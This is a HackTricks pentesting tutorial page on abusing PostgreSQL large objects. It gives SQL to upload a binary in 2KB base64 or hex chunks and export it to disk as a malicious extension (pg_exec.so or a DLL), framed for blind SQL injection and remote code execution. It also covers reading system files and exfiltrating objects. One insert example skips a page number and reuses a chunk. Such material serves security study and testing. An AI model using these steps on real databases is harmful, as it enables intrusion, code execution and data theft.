

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

- Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!

- Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)

- Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)

- **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **Share your hacking tricks by submitting PRs to the [hacktricks repo](https://github.com/carlospolop/hacktricks) and [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**.

</details>


# PostgreSQL Large Objects

PostgreSQL exposes a structure called **large object (**`pg_largeobject`  table), which is used for storing data that would be difficult to handle in its entirety (like an image or a PDF document). As opposed to the `COPY TO` function, the advantage of **large objects** lies in the fact that the **data** they **hold** can be **exported back** to the **file system** as an **identical copy of the original imported file**.

In order to **save a complete file inside this table** you first need to **create an object** inside the mentioned table (identified by a **LOID**) and then **insert chunks of 2KB** inside this object. It's very important that all the **chunks have 2KB** (except possible the last one) **or** the **exporting** function to the file system **won't work**.

In order to **split** your **binary** in **chunks** of size **2KB** you can do:

```bash
split -b 2048 pg_exec.so #This will create files of size 2KB
```

In order to encode each of the files created to Base64 or Hex you can use:

```bash
base64 -w 0 <Chunk_file> #Encoded in 1 line
xxd -ps -c 99999999999 <Chunk_file> #Encoded in 1 line
```

{% hint style="info" %}
When exploiting this remember that you have to send **chunks of 2KB clear-text bytes** (not 2KB of base64 or hex encoded bytes). If you try to automate this, the size of a **hex encoded** file is the **double** (then you need to send 4KB of encoded data for each chunk) and the size of a **base64** encoded file is `ceil(n / 3) * 4`
{% endhint %}

Also, debugging the process you can see the contents of the large objects created with:

```sql
 select loid, pageno, encode(data, 'escape') from pg_largeobject;
```

# Using lo\_creat & Base64

First, we need to create a LOID where the binary data is going to be saved:

```sql
SELECT lo_creat(-1);       -- returns OID of new, empty large object
SELECT lo_create(173454);   -- attempts to create large object with OID 43213
```

If you are abusing a **Blind SQLinjection** you will be more interested on using `lo_create` with a **fixed LOID** so you **know where** you have to **upload** the **content**.\
Also, note that there is no syntax error the functions are `lo_creat` and `lo_create`.

LOID is used to identify the object in the `pg_largeobjec`t table. Inserting chunks of size 2KB into the `pg_largeobject` table can be achieved using:

```sql
INSERT INTO pg_largeobject (loid, pageno, data) values (173454, 0, decode('<B64 chunk1>', 'base64'));
INSERT INTO pg_largeobject (loid, pageno, data) values (173454, 1, decode('<B64 chunk2>', 'base64'));
INSERT INTO pg_largeobject (loid, pageno, data) values (173454, 3, decode('<B64 chunk2>', 'base64'));
```

Finally you can export the file to the file-system doing (during this example the LOID used was `173454`):

```sql
SELECT lo_export(173454, '/tmp/pg_exec.so');
```

{% hint style="info" %}
Note the in newest versions of postgres you may need to **upload the extensions without indicating any path** at all. [**Read this for more information**.](rce-with-postgresql-extensions.md#rce-in-newest-prostgres-versions)
{% endhint %}

You possible may be interested in delete the large object created after exporting it:

```sql
SELECT lo_unlink(173454);  -- deletes large object with OID 173454
```

# Using lo\_import & Hex

In this scenario lo\_import is going to be used to create a large object object. Fortunately in this case you can (and cannot) specify the LOID you would want to use:

```sql
select lo_import('C:\\Windows\\System32\\drivers\\etc\\hosts');
select lo_import('C:\\Windows\\System32\\drivers\\etc\\hosts', 173454);
```

After creating the object you can start inserting the data on each page (remember, you have to insert chunks of 2KB):

```sql
update pg_largeobject set data=decode('<HEX>', 'hex') where loid=173454 and pageno=0;
update pg_largeobject set data=decode('<HEX>', 'hex') where loid=173454 and pageno=1;
update pg_largeobject set data=decode('<HEX>', 'hex') where loid=173454 and pageno=2;
update pg_largeobject set data=decode('<HEX>', 'hex') where loid=173454 and pageno=3;
```

The HEX must be just the hex (without `0x` or `\x`), example:

```sql
update pg_largeobject set data=decode('68656c6c6f', 'hex') where loid=173454 and pageno=0;
```

Finally, export the data to a file and delete the large object:

```sql
 select lo_export(173454, 'C:\\path\to\pg_extension.dll');
 select lo_unlink(173454);  -- deletes large object with OID 173454
```

{% hint style="info" %}
Note the in newest versions of postgres you may need to **upload the extensions without indicating any path** at all. [**Read this for more information**.](rce-with-postgresql-extensions.md#rce-in-newest-prostgres-versions)
{% endhint %}

# Limitations

After reading the documentation of large objects in PostgreSQL, we can find out that **large objects can has ACL** (Access Control List). It's possible to configure **new large objects** so your user **don't have enough privileges** to read them even if they were created by your user.

However, there may be **old object with an ACL that allows current user to read it**, then we can exfiltrate that object's content.


<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

- Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!

- Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)

- Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)

- **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **Share your hacking tricks by submitting PRs to the [hacktricks repo](https://github.com/carlospolop/hacktricks) and [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**.

</details>


